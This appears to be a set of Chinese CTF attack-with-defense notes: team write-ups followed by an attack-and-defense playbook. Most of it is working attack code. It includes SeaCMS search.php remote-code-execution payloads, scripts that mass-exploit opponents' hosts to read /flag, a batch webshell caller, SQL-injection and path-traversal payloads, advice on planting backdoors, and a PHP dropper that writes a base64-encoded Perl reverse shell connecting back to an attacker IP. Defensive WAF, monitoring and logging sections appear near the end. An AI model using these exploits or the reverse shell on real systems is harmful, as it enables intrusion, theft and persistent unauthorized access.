---
title: awd
tags:
---

awd()

```python
//rois_1
海洋cms /search.php?searchtype=5&tid=&area=eval($_POST[cmd])
两斤cms /gift.php 自带后门joomla /bak/ 旧版本pma
import requests
def exp(ip):    
  r = requests.get('http://%s:8084/gift.php?hello=cat+/flag>data/sqlbackup/1.txt'%ip)    
  r = requests.get('http://%s:8084/data/sqlbackup/1.txt'%ip)    
  return r.content
if __name__ == '__main__':    
  exp('172.16.5.14')
  -------
import requests, re
def exp(ip):    
  p = {}    
  r = requests.get('http://'+ip+':8083/search.php?searchtype=5&tid=&area=eval($_SERVER[HTTP_C])',headers={'C':'system("cat /flag");die();'},proxies=p)    
  flag = r.content    
  return flag
if __name__ == '__main__':    
  exp('172.16.5.24')
  
//rois_2
又见海洋cms，记得search.php有问题可以rce，找了下可以利用。写个exp直接脚本自动化攻击提交
//rois_3
Seacms /search.php?searchtype=5&tid=0&year=23334444);assert($_POST[aa]);//
[记得就这些了，不知道有没有少写]
```

```
mr.flag
前期上去本来想要做加固，结果发现没办法写文件，还以为要提权弄了好久，浪费了好久。后来扫描到8084有编辑器上传漏洞，而且还能回显地址，所以就上传了一句话批量管理，然后给自己也传了个加强版本的一句话作为管理后门。后来发现有人在我们自己的服务器上传了catflag的php来直接用网页获得flag，然后我们也都这么干了，在Firefox上面开了一整排的flag页面手动刷新和提交，因为不会编程2333333.

快结束的时候把提交flag的事情交给队友，我还测试了其他网页后台，一个是有弱口令，一个是海洋的有命令执行漏洞。感觉这回第一次玩AWD还是有点慌乱的。赛前以为是一台防守机，而且有比较高的权限，虽然做了准备但是一到比赛开始发现自己的策略一开始就不能用了。不过还是学到了很多。到比赛后才知道原来网站下有1.txt文件，可以访问获取所以就算把漏洞上传的堵上了还是能被拿到flag的。
```

```python
//Ph0en1x
search.php中存在漏洞，使用payload
http://172.16.5.13:8083/search.php?searchtype=5&tid=&area=eval($_POST[a])
直接获得一个一句话木马，然后用py脚本post
a=system('cat /flag');
即可反弹flag。
自动提交脚本
#encoding=utf8
import requests
import json
while 1:
    for i in xrange(1, 37):
        try:
            print str(i) + ':',
            if i == 12:
                continue
            url = "http://172.16.5." + str(i + 9) + ":8083/search.php?searchtype=5&tid=&area=eval($_POST[a])"
            poster = {"a":"system('cat /flag');"}
            flag = requests.post(url, poster).content[:36]
            print flag
            commiter = "http://172.16.4.1/Common/submitAnswer"
            answer = {"answer": flag, "token": "7c92f14732751912c18f04d26e83178b"}
            s = requests.post(commiter, answer).content
            s = s[4:s.find(",\"msg")]
            print s
        except Exception:
            print 'Fail to connect.'
```

```python
codemonster
下午AWD场
前半个小时一脸懵逼，不知道怎么访问别人的防御机，通过研究规则和拓扑图找到了别人的机子，然后先找web2漏洞，进了后台，拿不下shell，发现自己的web1被打，然后去看web1，随便找了一个队的防御机，弱口令admin admin 进后台，任意文件上传php木马拿下shell，菜刀连接，翻找目录找到1.txt，里面的字符串就是flag，提交了flag，发现打的竟然是自己学校的队伍，回学校差点被打死，然后换了个ip又拿下一个shell，僵硬的是打的竟然还是自己学校！后来打算一个个拿shell打过去，发现怎么改后台密码，怎么删shell我们的防御机web1都会被打，然后灵光一闪，发现直接访问ip+端口+/data/sqlbackup/1.txt 就能得到flag，时间太赶憋不出脚本，两个队友手动刷，提交flag服务器真的很卡，到这里差不多第10轮了，后面就是疯狂刷flag，只听见对面的队伍说了一句，他们变了，他们不是原来的对面了，后面十几轮一直尝试提权web2的防御机，没有成功，止步第七，拿下二等奖
比赛感想
第一次参加这一类的比赛，上午的CTF逆向是个大坑，全场就福大一队做了一题，下午的AWD吃了没有经验的亏，反应过来的时候别人已经刷了好几轮了，还有python脚本要好好学，最后二等奖拿了2000块钱，三个队员一人666.66，明年争取拿到更好成绩！
```

```
monster
完全吃了经验的亏，第二轮开始才找到攻击的平台，然后通过 Web1 管理后
台进去，发现 admin admin 弱密码。然后开始上传 shell ，get flag。中间一段时
间马被删了，然而提供的账号不能对文件进行操作，所以我发现是其他选手删除
我的木马。后来开始目录遍历，查找是否有其他方式 get flag，最后在
/data/sqlbackup/1.txt 发现 flag 文件，因此开始刷分，但是此时已经 20 轮了，来
不及刷分了。
```



伪静态规则 ssh登陆设置

流程：

1. 确认目标，配置脚本

   1. 主办方给定

   2. 自己获取 

      1. `nmap –sn 192.168.71.0/24 -oN targetHosts.txt  -sn: Ping Scan - disable port scan`
      2. 本机临时禁ping
         1.   `echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all`
         2.   `iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP`

   3. 分工

      1. 线下赛一般3人左右，2人攻击，1人防御，因为发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。比赛中每个队伍可能会维护多个靶机，web、二进制等，也可以每人负责一台，各自负责攻击和防御。

   4. 备份 [/var/www/html]

      1. 可以用scp命令，也可用一些图形化的工具：Winscp，FileZilla，操作起来比较方便。

   5. 文件的快速上传下载

   6. 快速恢复

      1. 出现异常的情况下可以立即恢复到初始状态

   7. 弱口令 ssh 后台

      1. 弱口令的问题几乎是必考，比赛开始后，如果发现每个队伍的SSH账号密码都是一样的（某次比赛中都是phpcms、wordpress），需要立即修改口令，如果被其他队伍改了那就gg了。Web后台很有可能存在弱口令，一般都是admin/admin,admin/123456,test/test等等，同样需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell，比如十分常见的wordpress。不过有的比赛不允许修改后台口令，如果修改视为服务宕机，这样还是不要动口令的心思了。
      2. 修改自己的
      3. 利用他人的
      4. 在口令被修改前完成维持权限

   8. 预留后门

      1. 主要是思路，大概就是把getflag的条件写在配置文件，在header头做手脚。把getflag的命令写在配置文件，配个demo使用。在自己的浏览器改ua就能看见flag了。

         ```php
         <?php 
         echo 'hello';
         $flag = 'ss';
         if (@$_SERVER['HTTP_USER_AGENT'] == 'flag'){
         	header("thisisflag:$flag"); 
         }
         ```

         ​

      2. 在维护的服务器上，很有可能已经预留了一个或多个后门，比如一句话木马，这个是送分题，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分（后面细说）。
         将服务器中web目录下载到本地，利用D盾扫描，一般就可以发现预留后门。发现后门后，第一时间删除，同时利用这个漏洞发起第一波攻击，如果利用菜刀连，显然不够优雅，还没连完，人家估计都删的差不多了，因此这个漏洞虽然是送分，但拼的是手速，因此得提前准备好脚本，配置一下其他队伍地址、shell路径和密码，就可以进行攻击，flag记录在firstround_flag.txt中。

         ```python
         #coding=utf-8
         import requests
         url="http://192.168.71."
         url1=""
         shell="/Upload/index.php"
         passwd="abcde10db05bd4f6a24c94d7edde441d18545" 
         port="80"
         payload = {passwd: 'system(\'cat /flag\');'}
         f=open("webshelllist.txt","w") 
         f1=open("firstround_flag.txt","w")
         for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: 
             url1=url+str(i)+":"+port+shell
             try:
                 res=requests.post(url1,payload,timeout=1)
                 if res.status_code == requests.codes.ok:
                     print url1+" connect shell sucess,flag is "+res.text
                     print >>f1,url1+" connect shell sucess,flag is "+res.text
                     print >>f,url1+","+passwd
                 else:
                     print "shell 404"
             except:
                 print url1+" connect shell fail"
         		
         f.close()
         f1.close()
         ```

      3. ​

   9. 加固，快速修改生效

   10. 常见漏洞

      1. 常见的漏洞包括SQL注入、文件包含、文件上传等等。对于SQL注入类的漏洞，一般不会有过滤，可以用sqlmap跑出来，再利用—sql-shell执行select load_file(‘/flag’);即可得到flag，也可以利用into outfile写木马维持权限，但要根据实际情况，可能会遇到权限问题。用sqlmap跑比较耗时，可以利用payload写一个python，自动化进行攻击：

         ```python
         def sqli(host):
             global sess_admin
             data = {"section_name":"asd","admin_name":"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'","announcement":"asd"}
             r = sess_admin.post('http://%s/index.php/section/add'%host,data=data)
             flags = re.findall(r'~(.+?)~',r.content)
             if flags:
                 return flags[0]
             else:
                 return "error pwn!"
         ```

      2. 上传漏洞一般也是比较简单的黑名单过滤、服务器解析漏洞等等，可以直接上传木马；

      3. 对于文件包含漏洞，直接可以通过../../../../../../flag的方式获取：

         ```python
         def include(host):
             r = requests.get(url="http://%s/?t=../../../../../../flag"%host)
             flags = re.findall(r'^(.+?)<',r.content)
             if flags:
                 return flags[0]
             else:
                 return "error pwn!"
         ```

   11. 权限维持

       1. 2种方法，需要网站的权限为www-data，如果网站的权限是ctf，那么是没有权限上传文件的。

       2. 这里说的方法就比较“搅屎”了，上面说到利用预留后门可以维持权限，主要有两种，一种是“不死马”，另一种是反弹shell

          1. 利用预留后门，上传上面的“不死马”并访问，就会一直生成.config.php的一句话木马，木马内容可以自行修改，只要别被其他队伍看懂就行。
             这个不死马比较猥琐，解决的方法需要重启apache，或者写一个程序不停kill这个不死马进程

          2. 反弹shell。利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，之后就可以一直得分了。`nc -lp 9999`

             ```php
             <?php 
             function which($pr) { 
             $path = execute("which $pr"); 
             return ($path ? $path : $pr); 
             } 
             function execute($cfe) { 
             $res = ''; 
             if ($cfe) { 
             if(function_exists('exec')) { 
             @exec($cfe,$res); 
             $res = join("\n",$res); 
             } elseif(function_exists('shell_exec')) { 
             $res = @shell_exec($cfe); 
             } elseif(function_exists('system')) { 
             @ob_start(); 
             @system($cfe); 
             $res = @ob_get_contents(); 
             @ob_end_clean(); 
             } elseif(function_exists('passthru')) { 
             @ob_start(); 
             @passthru($cfe); 
             $res = @ob_get_contents(); 
             @ob_end_clean(); 
             } elseif(@is_resource($f = @popen($cfe,"r"))) { 
             $res = ''; 
             while(!@feof($f)) { 
             $res .= @fread($f,1024); 
             } 
             @pclose($f); 
             } 
             } 
             return $res; 
             } 
             function cf($fname,$text){ 
             if($fp=@fopen($fname,'w')) { 
             @fputs($fp,@base64_decode($text)); 
             @fclose($fp); 
             } 
             } 
             $yourip = "192.168.71.1"; 
             $yourport = '9999'; 
             $usedb = array('perl'=>'perl','c'=>'c'); 
             $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". 
             "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". 
             "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". 
             "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". 
             "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". 
             "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". 
             "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; 
             cf('/tmp/.bc',$back_connect); 
             $res = execute(which('perl')." /tmp/.bc $yourip $yourport &"); 
             ?> 
             ```

   12. 自我审计

       1. 比赛开始后，先去服务器上将自己的代码备份一下，并开始Review自己Web。上午的时间就是一边使用脚本抓取flag，一边查看其它队伍怎么修补的漏洞，试着改进抓取脚本。有的队伍返回了一个假的flag，被检查程序check down了；有的队伍发现新注册用户就立即删除，于是我们改进每次都新建用户直接登陆抓取；还有些队伍修补了漏洞，这样子就没办法了。
       2. 比赛总体下来，我们的Pwn次次被打，而且还down过几次，打了也没办法，down只好乖乖把备份传上去整好。真是别人去你家偷东西你还不能还手，门搞坏了也要默默弄好让别人下次接着偷👿。下午还发现了一个内存马，杀掉除root以外的apache进程就可以了，sudo -u www-data kill -9 <进程号>，不过杀了一次后他们没有攻第二次，看来他们的洞利用起来有些麻烦，估计是手动的。
       3. 现场挖洞思路 http://sumygg.com/2017/05/20/tsctf-2017-offline-final-contest/ 
          `{php}echo file_get_contents('/var/www/flag'); {/php}`
       4. 发现一个后台未校验权限的漏洞，导致任何登陆用户都可以进入后台。

   13. 流量分析->攻防

       1. pyinotify  python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，线下赛中通常没法联网安装库，所以我们可以手工把库文件传到靶机里python库中: /usr/lib/pythonXXX/site-packages，但是更方便的做法是借用pyinstaller等工具将其打包成linux可执行文件。安装了pyinotify库之后，我们仅仅运行在机器上： "python -m pyinotify 监控目录路径" 这条简单的命令，就可以看到对这个目录以及该目录下所有进行任何操作的的监控日志。

   14. 通用防御

       1. 对于防御，一般通用有两种方法：WAF、文件监控

       2. 文件监控可以对web目录进行监控，发现新上传文件或者文件被修改立即恢复，这样可以防止上传shell等攻击：awd_tools/file_moniter.py

       3.  web的通防有许多种，基础的有输入拦截，对get，post等等的参数输入进行行拦截，过滤敏敏感的关键词等。。。更更高级的有转发，将访问的返回值进行行审查，匹配本地的flag文件，如果内容一样，说明攻击成功，替换flag的内容或者直接exit()。但是不不管是哪一种，很重要的一个点就是记录其他用户的payload。
          从防火墙匹配返回流量内容，如果遇到flag，就丢包/替换flag内容  会check出问题码???

       4. ​

       5. 需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。

          ```
          使用方法：
          1.将waf.php传到要包含的文件的目录
          2.在页面中加入防护，有两种做法，根据情况二选一即可：
          a).在所需要防护的页面加入代码
              require_once('waf.php');  
              就可以做到页面防注入、跨站
              如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！
              添加require_once(‘waf.php’);来调用本代码
              常用php系统添加文件

              PHPCMS V9 \phpcms\base.php
              PHPWIND8.7 \data\sql_config.php
              DEDECMS5.7 \data\common.inc.php
              DiscuzX2   \config\config_global.php
              Wordpress   \wp-config.php
              Metinfo   \include\head.php
          b).在每个文件最前加上代码
              在php.ini中找到:
              Automatically add files before or after any PHP document.
              auto_prepend_file = 360_safe3.php路径;
          ```

          ​

   15. 工具：

       1. AWD:nc，scp/Winscp/FileZilla，tcpdump,wireshark，tar，vi，D盾
          1. agent ransack 
             1. 搜索 'flag',flag字符串，
          2. 代码审计
       2. 解题
          1. 御剑，AWVS   sqlmap nmap weely  菜刀

   16. 乌云，经典cms合集

   17. 流量、日志

       1. 通过流量、日志的分析：
          1.感知可能正在发生的攻击，从而规避存在的安全风险
          2.应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失

       2. 在比赛机器上抓取流量`tcpdump -s 0 -w flow.pcap port 9999` 。本地wireshark分析。

       3. 日志

          ```php
          date_default_timezone_set('Asia/Shanghai');
          $ip        = $_SERVER["REMOTE_ADDR"];   //访问IP
          $filename  = $_SERVER['PHP_SELF'];  //访问的文件
          $parameter = $_SERVER["QUERY_STRING"];  //查询的字符串
          $method    = $_SERVER['REQUEST_METHOD']; //请求方法
          ...
          $time      =  date('Y-m-d H:i:s',time()); //请求时间
          $post      = file_get_contents("php://input",'r'); //接收POST数据
          $others    = '**********************************************************************';
          $logadd    = '访问时间：'.$time.'访问IP:'.$ip.'请求方法：'.$method.' '.'访问链接：'.$filename.'?'.$parameter."\r\n";...
          //记录写入
          $fh = fopen("log.txt", "a");
          fwrite($fh, $logadd);
          fwrite($fh,print_r($_COOKIE, true)."\r\n");
          fwrite($fh,$others."\r\n");
          fclose($fh);
          ```

          ​

   18. 自动提交

       1. 有的比赛只有几分钟一轮，手工提交其他队伍flag显然不行，需要准备批量提交flag的脚本：

          ```python
          #!/usr/bin/env python2
          import sys
          import json
          import urllib
          import httplib
          server_host = '10.10.0.2'
          server_port = 80
          def submit(team_token, flag, host=server_host, port=server_port, timeout=5):
              if not team_token or not flag:
                  raise Exception('team token or flag not found')
              conn = httplib.HTTPConnection(host, port, timeout=timeout)
              params = urllib.urlencode({
                  'token': team_token,
                  'flag': flag,
              })
              headers = {
                  "Content-type": "application/x-www-form-urlencoded"
              }
              conn.request('POST', '/api/submit_flag', params, headers)
              response = conn.getresponse()
              data = response.read()
              return json.loads(data)

          if __name__ == '__main__':
              if len(sys.argv) < 3:
                  print 'usage: ./submitflag.py $team_token $flag'
                  sys.exit()
              host = server_host
              if len(sys.argv) > 3:
                  host = sys.argv[3]
              print json.dumps(submit(sys.argv[1], sys.argv[2], host=host), indent=4)
          ```

          ​

winscp连上自己的机子，压缩 /var/www/html 下载到本地，删除备份

备份：

```
tar cpf foo.tar foo/ 创建初始归档文件，保留属性
tar tvf foo.tar 列举压缩包内容
tar cf bar.tar foo/ 创建修改后的归档文件
rm -rf foo/ && tar xpf foo.tar 删除修改后的文件并还原，保留属性；如果直接解压会增量覆盖
```



D盾扫自带的后门，agent ransack全局搜索flag所在位置，





自带后门:删除后门，打别人

功能点(search.php)被攻击：修改代码，修改文件夹(eg. upload)权限 chmod -r 000

有没可能检测到主办方check本机的流量

快捷的上传下载方式

```
分工：

```

